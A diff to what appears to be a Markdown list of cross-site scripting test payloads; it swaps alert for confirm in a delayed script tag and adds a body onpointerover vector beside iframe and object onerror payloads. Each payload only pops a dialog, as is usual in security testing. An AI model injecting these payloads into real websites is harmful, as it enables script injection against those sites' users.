@@ -129,13 +129,15 @@
 
 ```
 <script>
-  setTimeout(function() { alert('XSS'); }, 1000);
+  setTimeout(function() { confirm('XSS'); }, 1000);
 </script>
 ```
 
 `<iframe src="javascript:alert('XSS')"></iframe>`
 
 `<object data="x" onerror="alert('XSS')"></object>`
+
+`<body onpointerover="alert('XSS')">`
 
 
 
